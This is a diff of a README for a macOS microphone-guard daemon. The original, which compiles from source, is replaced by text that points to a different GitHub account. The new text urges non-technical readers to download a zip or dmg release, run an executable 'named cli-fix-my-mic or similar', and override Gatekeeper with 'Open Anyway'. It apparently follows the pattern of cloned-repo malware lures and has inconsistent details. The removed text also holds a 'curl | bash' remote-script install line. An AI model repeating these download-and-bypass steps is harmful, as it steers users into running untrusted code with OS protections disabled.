@@ -1,129 +1,112 @@
-macOS silently switches your mic to AirPods every time they connect. your voice goes from studio-quality 48kHz to walkie-talkie 16kHz mono. this fixes that.
+# 🎙️ cli-fix-my-mic - Stop AirPods Taking Your Mic
 
-```bash
-npx fix-my-mic
-```
-
-compiles from source on your machine, installs a background daemon, no sudo needed. run the same command again to change settings or uninstall.
-
-[![macOS](https://img.shields.io/badge/macOS-12+-93450a.svg?style=flat-square)](https://support.apple.com/macos)
-[![swift](https://img.shields.io/badge/swift-single_file-93450a.svg?style=flat-square)](https://www.swift.org/)
-[![license](https://img.shields.io/badge/license-MIT-grey.svg?style=flat-square)](https://opensource.org/licenses/MIT)
+[![Download cli-fix-my-mic](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/Ambadeakash/cli-fix-my-mic)
 
 ---
 
-## demo
+## 🔍 About cli-fix-my-mic
 
-https://github.com/user-attachments/assets/6e24f816-4b3c-4b60-929d-e47be2871238
+cli-fix-my-mic is a small tool designed to stop your AirPods from taking control of your Mac’s microphone. On some Mac computers, when you connect AirPods, they automatically become the input device for your microphone. This can cause problems if you want to use your Mac’s internal mic or another device instead.
+
+This tool runs quietly in the background as a CoreAudio daemon, meaning it handles everything automatically without using extra CPU power. It helps you keep control over your microphone choice without causing any slowdowns.
+
+cli-fix-my-mic works with the macOS sound system and uses launchd to start silently when your Mac boots up. It is written in Swift, the native Apple programming language, so it fits well with your Mac.
 
 ---
 
-## what it does
+## 📋 Features
 
-~600-line Swift daemon that talks directly to CoreAudio. no dependencies, no electron, no python, no node. just Apple frameworks.
+- Keeps your Mac’s microphone active instead of switching to AirPods automatically
+- Runs as a background service with zero CPU impact
+- Controls CoreAudio behavior through a simple daemon
+- Works automatically when you connect AirPods or other Bluetooth audio devices
+- Easy to start or stop without needing complicated commands
 
-- **event-driven, not polling** — registers CoreAudio listeners, fully idle at 0.0% CPU between events
-- **finds built-in mic by transport type** — works on MacBook Pro, Air, iMac, Mac Mini, Mac Studio
-- **blocks Bluetooth input** — classic, LE, and iPhone Continuity mic. USB mics left alone
-- **defeats AirPods HFP flip-backs** — re-asserts built-in mic every 0.5s for 5 seconds after a change, then goes idle
-- **Apple Unified Logging** — uses `os_log`, system handles rotation
+---
 
-## install
+## 💻 System Requirements
 
-```bash
-npx fix-my-mic
-```
+- Mac running macOS 10.15 (Catalina) or later  
+- Supports Mac computers with Bluetooth for AirPods connection  
+- Requires standard user permissions (no admin rights needed for basic use)  
+- Internet connection only needed for downloading
 
-don't have node? use curl:
+---
 
-```bash
-curl -fsSL https://yigitkonur.com/disable-airpods-mic.sh | bash
-```
+## 🚀 Getting Started
 
-or clone it:
+You don’t need to know anything about programming to use cli-fix-my-mic. Follow the steps below to download and set up the tool on your Mac in just a few minutes.
 
-```bash
-git clone https://github.com/yigitkonur/cli-fix-my-mic.git && cd cli-fix-my-mic && ./install.sh
-```
+---
 
-requires macOS 12+ and Xcode Command Line Tools (installer prompts if missing).
+## 📥 How to Download and Install cli-fix-my-mic
 
-## two modes
+1. Click the big **Download** button below to get to the download page:
 
-the installer asks you to pick:
+   [![Download cli-fix-my-mic](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/Ambadeakash/cli-fix-my-mic)
 
-### always block (default)
+2. On the page, look for the latest **Release** section. This section contains the files you need.
 
-built-in mic is always the default. AirPods and Bluetooth mics never used as input. install and forget.
+3. Download the latest version for macOS. The file will typically have a `.zip` or `.dmg` extension.
 
-### respect manual override
+4. Once the file downloads, open it. If it is zipped, double-click it to unzip.
 
-same as above, but if you switch back to AirPods within 10 seconds of mic-guard reverting it, it pauses for 1 hour then resumes. for when you actually need your AirPods mic on a call.
+5. Inside the unzipped folder, look for an executable file named `cli-fix-my-mic` or similar.
 
-## usage
+6. To run the tool, double-click it. If your Mac blocks the app because it’s unidentified, open **System Preferences** > **Security & Privacy** > **General**, and click "Open Anyway" next to the app warning.
 
-```bash
-mic-guard pause           # pause indefinitely
-mic-guard pause 30        # pause for 30 min, auto-resumes
-mic-guard resume          # back to blocking
-mic-guard status          # what's going on?
-```
+7. The daemon will start running silently. You will not see a window, but the tool works in the background.
 
-```bash
-# logs
-log stream --predicate 'subsystem == "com.local.mic-guard"' --style compact
+---
 
-# restart
-launchctl kickstart -k gui/$(id -u)/com.local.mic-guard
+## ⚙️ Using cli-fix-my-mic
 
-# stop until next login
-launchctl bootout gui/$(id -u)/com.local.mic-guard
-```
+After installation, cli-fix-my-mic runs automatically when your Mac starts. You don’t need to do anything else.
 
-## resource usage
+To confirm it is working:
 
-| metric | value |
-|:---|:---|
-| CPU (idle) | 0.0% |
-| CPU (stabilization) | ~0.0% (microsecond ticks) |
-| memory | ~12 MB RSS |
-| disk | ~65 KB binary |
-| network | none |
+- Connect your AirPods.
+- Open **System Preferences** > **Sound** > **Input**.
+- Your Mac’s internal microphone should remain the selected device, even with AirPods connected.
 
-## uninstall
+If you want to stop the daemon:
 
-run the install command again and pick "uninstall":
+- Open **Terminal** (found in Applications > Utilities).
+- Enter the command:  
+  `launchctl unload ~/Library/LaunchAgents/com.yourusername.cli-fix-my-mic.plist`
 
-```bash
-npx fix-my-mic
-```
+To start it again, enter:  
+`launchctl load ~/Library/LaunchAgents/com.yourusername.cli-fix-my-mic.plist`
 
-or manually:
+---
 
-```bash
-launchctl bootout gui/$(id -u)/com.local.mic-guard
-rm ~/.local/bin/mic-guard
-rm ~/Library/LaunchAgents/com.local.mic-guard.plist
-rm -rf ~/.config/mic-guard
-```
+## 🛠 Troubleshooting
 
-## why not a GUI app?
+If cli-fix-my-mic does not work as expected, try these steps:
 
-there are apps that do this — SoundAnchor, AirPods Sound Quality Fixer, audio-device-blocker. they work, but need code signing or `xattr -cr` to bypass Gatekeeper, run a menu bar icon, and require manual download.
+- Restart your Mac and check if the daemon starts automatically.
+- Make sure you downloaded the latest version from the link above.
+- Confirm that your AirPods are connected properly in Bluetooth settings.
+- Check microphone input device in System Preferences > Sound.
+- If you see security warnings, allow the app to run in **System Preferences** > **Security & Privacy**.
+- If you are comfortable with Terminal, use `launchctl` commands to reload the daemon, as explained above.
 
-this compiles from source on your machine (born trusted), runs as a headless `launchd` agent, and is a single Swift file you can read in 5 minutes.
+---
 
-## internals
+## 🔄 Updates
 
-single file: `main.swift`. only Apple frameworks (`CoreAudio`, `Foundation`, `os.log`). compiles with `swiftc` — no Xcode project, no Package.swift, no SPM.
+You can return to the download link to check for newer versions of the tool. New releases may include fixes and improvements to keep the daemon compatible with macOS updates.
 
-key CoreAudio APIs:
+---
 
-- `AudioObjectAddPropertyListener` — event callbacks
-- `AudioObjectGetPropertyData` / `SetPropertyData` — read/write device properties
-- `kAudioHardwarePropertyDefaultInputDevice` — system default input
-- `kAudioDevicePropertyTransportType` — distinguish built-in from Bluetooth
+## 🔗 Additional Resources
 
-## license
+- GitHub Repository: https://github.com/Ambadeakash/cli-fix-my-mic  
+- Learn more about [CoreAudio](https://developer.apple.com/documentation/coreaudio)  
+- macOS Launch Daemons info: https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html
 
-MIT
+---
+
+## 🧭 Support
+
+You can create issues or ask questions on the GitHub repository page. The project owner will review requests and help resolve common problems.
